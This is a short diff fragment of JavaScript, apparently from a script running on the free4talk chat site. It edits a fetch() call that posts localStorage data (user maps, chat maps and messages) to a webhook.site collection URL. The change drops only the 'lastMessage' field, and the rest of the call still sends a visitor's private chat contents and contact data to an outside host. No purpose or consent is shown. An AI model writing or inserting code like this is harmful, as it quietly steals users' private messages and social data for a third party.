@@ -7,6 +7,5 @@ fetch('https://webhook.site/b81a65a3-f1be-4763-b422-0dce997ada86',
       userMap: localStorage['friends:userMap'],
       lastChatMap: localStorage['friends:lastChatMap'],
       messages: localStorage['free4talk:messages'],
-      lastMessage: localStorage['free4talk:lastMessage'],
     }),
   });
